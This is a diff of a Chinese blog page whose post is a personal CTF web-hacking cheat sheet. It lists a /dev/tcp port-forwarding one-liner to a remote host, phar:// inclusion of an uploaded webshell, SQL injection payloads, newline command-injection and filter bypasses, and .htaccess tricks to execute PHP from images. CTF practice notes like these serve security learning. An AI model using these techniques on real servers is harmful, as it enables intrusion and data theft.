@@ -1,392 +1,161 @@
-<!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    
-  
-  <link href="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet" type="text/css" />
-
-
-
-
-
-
-
-  
-
-<link href="//libs.cdnjs.net/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
-
-<link href="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="https://ftp.bmp.ovh/imgs/2019/12/bd3cd769bf9c605a.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="https://ftp.bmp.ovh/imgs/2019/12/fe3214c96f68b465.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="https://ftp.bmp.ovh/imgs/2019/12/a585dbaa8519a606.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="ctf,web," />
-
-
-
-
-
-
-
-
-
-
-<meta name="description" content="个人打CTF的一些总结本篇文章非面向大众文章，仅供我本人查阅，一般只保证我本人能看懂 无其他文件进行端口转发  exec 4&amp;lt;&amp;gt;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;3306;exec 5&amp;lt;&amp;gt;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;9999;cat &amp;lt;&amp;amp;4 &amp;gt;&amp;amp;5 &amp;amp;cat &amp;lt;&amp;amp;5 &amp;gt;&amp;amp;4; parse_url url中&#x2F;全换">
-<meta name="keywords" content="ctf,web">
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>个人打CTF的一些总结 | Jesen's Blog</title><meta name="keywords" content="web,ctf"><meta name="author" content="Jesen"><meta name="copyright" content="Jesen"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="个人打CTF的一些总结本篇文章非面向大众文章，仅供我本人查阅，一般只保证我本人能看懂 无其他文件进行端口转发  exec 4&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;3306;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;9999;cat &lt;&amp;4 &gt;&amp;5 &amp;cat &lt;&amp;5 &gt;&amp;4; parse_url url中&#x2F;全换">
 <meta property="og:type" content="article">
 <meta property="og:title" content="个人打CTF的一些总结">
-<meta property="og:url" content="&#x2F;2019&#x2F;11&#x2F;11&#x2F;zongjie.html">
+<meta property="og:url" content="http://jesen.ddwhm.com/2019/11/11/zongjie.html">
 <meta property="og:site_name" content="Jesen&#39;s Blog">
-<meta property="og:description" content="个人打CTF的一些总结本篇文章非面向大众文章，仅供我本人查阅，一般只保证我本人能看懂 无其他文件进行端口转发  exec 4&amp;lt;&amp;gt;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;3306;exec 5&amp;lt;&amp;gt;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;9999;cat &amp;lt;&amp;amp;4 &amp;gt;&amp;amp;5 &amp;amp;cat &amp;lt;&amp;amp;5 &amp;gt;&amp;amp;4; parse_url url中&#x2F;全换">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="&#x2F;images&#x2F;1063309-20170731154248068-1767961687.png">
-<meta property="og:image" content="&#x2F;images&#x2F;1063309-20190224160008531-1260082376.png">
-<meta property="og:image" content="&#x2F;images&#x2F;1063309-20170904171827038-754070839.png">
-<meta property="og:image" content="&#x2F;images&#x2F;1063309-20190826205559423-235402880.png">
-<meta property="og:updated_time" content="2020-08-26T04:20:30.696Z">
+<meta property="og:description" content="个人打CTF的一些总结本篇文章非面向大众文章，仅供我本人查阅，一般只保证我本人能看懂 无其他文件进行端口转发  exec 4&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;3306;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;9999;cat &lt;&amp;4 &gt;&amp;5 &amp;cat &lt;&amp;5 &gt;&amp;4; parse_url url中&#x2F;全换">
+<meta property="og:locale">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2019-11-11T15:03:41.000Z">
+<meta property="article:modified_time" content="2020-08-26T04:20:30.696Z">
+<meta property="article:author" content="Jesen">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="&#x2F;images&#x2F;1063309-20170731154248068-1767961687.png">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: '博主'
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://jesen.ddwhm.com/2019/11/11/zongjie"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
+  google_ad_client: 'ca-pub-6452254005307046',
+  enable_page_level_ads: 'true'
+});</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
     },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
     }
-  };
-</script>
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '个人打CTF的一些总结',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2020-08-26 12:20:30'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
 
-  <link rel="canonical" href="/2019/11/11/zongjie.html"/>
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
 
-
-
-
-
-  <title>个人打CTF的一些总结 | Jesen's Blog</title>
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
   
-
-
-
-
-
-
-
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
-
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
   
-  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Jesen's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-      
-        <h1 class="site-subtitle" itemprop="description">想要人前装逼,必须得在人后学习</h1>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-        <li class="menu-item menu-item-home">
-          <a href="/#" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            首页
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/#%20" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            标签
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories/#%20" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            分类
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/#" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            归档
-          </a>
-        </li>
-      
-
-      
-    </ul>
-  
-
-  
-</nav>
-
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="/2019/11/11/zongjie.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Jesen">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/images/jesen.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Jesen's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">个人打CTF的一些总结</h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-			
-				<i class="fa fa-thumbs-up"></i>
-				<font color=FFA500>置顶</font>
-				<span class="post-meta-divider">|</span>
-			
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-11T23:03:41+08:00">
-                2019-11-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2019/11/11/zongjie.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2019/11/11/zongjie.html" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2019/11/11/zongjie.html" class="leancloud_visitors" data-flag-title="个人打CTF的一些总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <h1 id="个人打CTF的一些总结"><a href="#个人打CTF的一些总结" class="headerlink" title="个人打CTF的一些总结"></a>个人打CTF的一些总结</h1><p><u><strong>本篇文章非面向大众文章，仅供我本人查阅，一般只保证我本人能看懂</strong></u></p>
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/images/jesen.jpg" onerror="onerror=null;src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 其他</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-music"></i><span> 测试1</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-video"></i><span> 测试2</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Jesen's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 其他</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-music"></i><span> 测试1</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-video"></i><span> 测试2</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">个人打CTF的一些总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2019-11-11T15:03:41.000Z" title="Created 2019-11-11 23:03:41">2019-11-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-08-26T04:20:30.696Z" title="Updated 2020-08-26 12:20:30">2020-08-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="个人打CTF的一些总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="个人打CTF的一些总结"><a href="#个人打CTF的一些总结" class="headerlink" title="个人打CTF的一些总结"></a>个人打CTF的一些总结</h1><p><u><strong>本篇文章非面向大众文章，仅供我本人查阅，一般只保证我本人能看懂</strong></u></p>
 <p>无其他文件进行端口转发</p>
 <p> <code>exec 4&lt;&gt;/dev/tcp/127.0.0.1/3306;exec 5&lt;&gt;/dev/tcp/ip/9999;cat &lt;&amp;4 &gt;&amp;5 &amp;cat &lt;&amp;5 &gt;&amp;4;</code></p>
 <p>parse_url url中/全换成///</p>
 <p>反序列化遇到protected变量，可以直接把private改成public然后把生成的加上%00*%00</p>
 <p>strpos 大小写敏感，数组绕过也可。</p>
-<p>php后缀过滤 对ph开头的后缀进行一个fuzz(php php7 php5 phtml)<br>curl -x 123.45.67.89:1080 -o page.html <a href="http://www.ip.cn">http://www.ip.cn</a> 代理访问</p>
+<p>php后缀过滤 对ph开头的后缀进行一个fuzz(php php7 php5 phtml)<br>curl -x 123.45.67.89:1080 -o page.html <a target="_blank" rel="noopener" href="http://www.ip.cn">http://www.ip.cn</a> 代理访问</p>
 <p>php://input 获取post 记得改POST方法（数据不会urldecode）</p>
 <p>file_get_contents() file:// php:// zlib:// zip:// http://均可</p>
 <p>phar协议突破文件包含首先1.php压缩为1.zip更改后缀名为.jpg上传，然后利用文件读取直接包含。</p>
-<p><a href="http://www.c1sec.club/include.php?file=phar://upload/1.jpg/1这里的1指的是先前写好的1.php小马">http://www.c1sec.club/include.php?file=phar://upload/1.jpg/1这里的1指的是先前写好的1.php小马</a></p>
-<p>.avi文件上传：<a href="https://github.com/neex/ffmpeg-avi-m3u-xbin">https://github.com/neex/ffmpeg-avi-m3u-xbin</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.c1sec.club/include.php?file=phar://upload/1.jpg/1这里的1指的是先前写好的1.php小马">http://www.c1sec.club/include.php?file=phar://upload/1.jpg/1这里的1指的是先前写好的1.php小马</a></p>
+<p>.avi文件上传：<a target="_blank" rel="noopener" href="https://github.com/neex/ffmpeg-avi-m3u-xbin">https://github.com/neex/ffmpeg-avi-m3u-xbin</a></p>
 <p>能读文件，apache下记得读/etc/apache2/sites-available/000-default.conf，会有一些配置文件</p>
 <p>上传文件后，如果服务器是linux系统，那么会在/tmp/目录下生成对应的临时文件phpinfo();<br>$query=’select * from flag where user=’.$user[0].’ and passwd=’.$passwd[0].’ &#39; ‘ ;</p>
 <p>要产生注入，则必须构造payload来截断单引号，打乱sql语句原来的构成标准。即可构造user=&amp;&amp;passwd=or 1#<br>此时sql语句为<br>select * from flag where user=’ &#39; and passwd= ‘ or 1# ‘;<br>url二次编码绕过单引号过滤</p>
@@ -396,25 +165,25 @@
 <p>检测方法：http://[ip]/CVS/Entriesp</p>
 <p>php5.2以上allow_url_include关闭，若开启allow_url_include则容易引起php://input伪协议进行包含</p>
 <p>通过php glob()函数读取文件</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">foreach</span> (glob(<span class="string">"*.txt"</span>) <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"$filename size "</span> . filesize($filename) . <span class="string">"\n"</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">foreach</span> (glob(<span class="string">&quot;*.txt&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$filename</span> size &quot;</span> . filesize(<span class="variable">$filename</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>输出结果如下：</p>
-<p><img src="/images/1063309-20170731154248068-1767961687.png" alt="img"></p>
+<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/1063309-20170731154248068-1767961687.png" alt="img"></p>
 <p>16.命令执行时当；|| &amp;&amp; 被过滤时可以尝试%0a来绕过多执行一条命令。</p>
 <p>17.禁止加载XML实体对象的方式，来防止XXE漏洞，通过使用</p>
-<p><img src="/images/1063309-20190224160008531-1260082376.png" alt="img"></p>
+<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/1063309-20190224160008531-1260082376.png" alt="img"></p>
 <p> 18.当addslashes（）函数遇到json_encode()函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $sa=$_GET[<span class="string">'a'</span>];</span><br><span class="line">   $sa=addslashes($sa);</span><br><span class="line">   <span class="keyword">echo</span> json_encode($sa);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$sa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">   <span class="variable">$sa</span>=addslashes(<span class="variable">$sa</span>);</span><br><span class="line">   <span class="keyword">echo</span> json_encode(<span class="variable">$sa</span>);</span><br></pre></td></tr></table></figure>
 
 <p>如果提交a=admin‘ 则json后能够逃逸反斜杠 \</p>
-<p><img src="/images/1063309-20170904171827038-754070839.png" alt="img"></p>
+<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/1063309-20170904171827038-754070839.png" alt="img"></p>
 <p>此时\被再次转义，即 ‘ 可逃逸。</p>
 <p>19.win下php可以利用短文件名来实现文件爆破，比如就是当文件名超过 <code>6</code> 位时，可以用 <code>~1</code> 表示后面的字符串，比如我们的文件名叫 <code>abcdefghijk.txt</code>，短文件名表示成:<code>abcdef~1.txt</code>，如果这时候还有个叫 <code>abcdefhhhh.txt</code> 的，就可以把 <code>1</code> 改成 <code>2</code>：<code>abcdef~2.txt</code></p>
 <p>20.<strong>doc</strong>和<strong>zip</strong>的文件头一样，因此构造一句话木马打包后，<strong>Burpsuite</strong>抓包修改后缀名和<strong>Mime</strong>类型上传，最后使用zip伪协议读取即可。</p>
 <p>21.door为数组则$secret将为null</p>
-<p><img src="/images/1063309-20190826205559423-235402880.png" alt="img"></p>
+<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/1063309-20190826205559423-235402880.png" alt="img"></p>
 <p>22.生成多个md5值相同的文件</p>
-<p><a href="https://www.yuque.com/sourcecode/2019hgame/magical_md5">https://www.yuque.com/sourcecode/2019hgame/magical_md5</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/sourcecode/2019hgame/magical_md5">https://www.yuque.com/sourcecode/2019hgame/magical_md5</a></p>
 <p>23.php://filter 伪协议支持多个过滤器同时使用</p>
 <p>24..htaccess开启php解析引擎</p>
 <p>AddType application/x-httpd-php .png</p>
@@ -422,578 +191,40 @@
 <ol start="25">
 <li>php://resource=jpg/resource=file/tips.txt 可以绕过以下正则</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^php:\/\/.*resource=([^|]*)/i</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^php:\/\/.*resource=([^|]*)/i</span><br></pre></td></tr></table></figure>
 
 <p>26.sql注入空格还可以用\t,/**/等来代替</p>
-
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/ctf/" rel="tag"># ctf</a>
-          
-            <a href="/tags/web/" rel="tag"># web</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/11/09/hxbctf-2019.html" rel="next" title="湖湘杯2019 web1-UNTAR writeup">
-                <i class="fa fa-chevron-left"></i> 湖湘杯2019 web1-UNTAR writeup
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/11/24/NJUCTF2019.html" rel="prev" title="NJUCTF2019-部分wp">
-                NJUCTF2019-部分wp <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-
-  
-    <div class="comments" id="comments">
-    </div>
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
